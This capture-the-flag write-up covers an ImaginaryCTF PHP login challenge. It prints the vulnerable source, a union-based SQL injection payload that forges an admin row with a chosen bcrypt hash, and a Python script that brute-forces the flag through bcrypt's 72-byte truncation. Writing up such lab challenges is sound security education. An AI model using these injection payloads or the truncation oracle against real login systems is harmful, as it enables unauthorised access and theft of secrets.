# Overview
A challenge that exploits bcrypt behavior.

# Solution
When inspecting with dev tool, we can see a commented block at the bottom.
It gave us a link to `/?source`

Navigate to the page and we will see the source code:
```php=
<?php

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}

$flag = $_ENV['FLAG'] ?? 'jctf{test_flag}';
$magic = $_ENV['MAGIC'] ?? 'aabbccdd11223344';
$db = new SQLite3('/db.sqlite3');

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$msg = '';

if (isset($_GET[$magic])) {
    $password .= $flag;
}

if ($username && $password) {
    $res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = '$username'", true);
    if (!$res) {
        $msg = "Invalid username or password";
    } else if (password_verify($password, $res['pwhash'])) {
        $u = htmlentities($res['username']);
        $msg = "Welcome $u! But there is no flag here :P";
        if ($res['username'] === 'admin') {
            $msg .= "<!-- magic: $magic -->";
        }
    } else {
        $msg = "Invalid username or password";
    }
}
?>

It's a login page with a obvious sql injection vulnerability, but it looks like the flag cannot be retrieved directly (since it's concatenated in `$password`)
To get the flag, we need to get the `$magic`, which is load from ENV.

The sql injection technique I learned here is that **union based sql injection can also be used to fake the data**.

The authenticating code didn't checks the complete the whole auth process in sql statement.
So typical sql injection `admin' or 1=1 -- -` won't work.

But with union available, we can fake the username and password hash ourselves.
`password_verify()` checks user input with a hash generated by `password_hash()`.

So we just need to calc the blowfish hash of "1", and put our input and faked hash in the payload:
```python=
# As long as the original select statement didn't find anything,
# our fake record will be selected as $row
data = {
	"username": "adminasdasdasd' union select 'admin', '$2b$12$zlMgDAKYPqxA787D83eYeeBy5pb06naORsaDNWsjPTisdTYSI1Tqm' -- -",
	"password": 1
}
```

Then we can get the `$magic`!
I stucked at the flag part for few hours, but managed to solve it.

The `$flag` was concatenated into `$password`, so we need to leak the flag from something related to `$password`.

At first I was trying to leak the password by triggering error, but it seems impossible, the error never printed variable values.

Then I decided to find if there's any way to abuse `password_verify()`
It turns out it's possible, the password input has a 72 bytes length limit, only the first 72 characters will be used.
So, combine the techniques above, we can bruteforce the flag characters by truncating the `$password`, which was just concatenated with `$flag`:
```python=
import requests, string, bcrypt
table = string.ascii_letters+string.digits+"?!$:=,-|\\/!{@_}"

url = "http://login.chal.imaginaryctf.org/"
params = {"688a35c685a7a654abc80f8e123ad9f0": "123"}

salt = bcrypt.gensalt()

success = "Welcome admin"
result = "ictf{"

while not result.endswith("}"):
    prefix = "a" * (72 - len(result) - 1)
    for c in table:
        temp = result + c
        payload = prefix + temp
        hash = bcrypt.hashpw(payload.encode('utf-8'), salt).decode('utf-8')
        data = {
            "username": f"adminasdasdasd' union select 'admin', '{hash}' -- -",
            "password": prefix
        }
        response = requests.post(url=url, data=data, params=params)
        if (success in response.text):
            result = temp
            print("flag now: " + result)
            print("-"*20)
            break
        else:
            print(temp, "<-- fail")
            print("-"*20)

print(result)
```
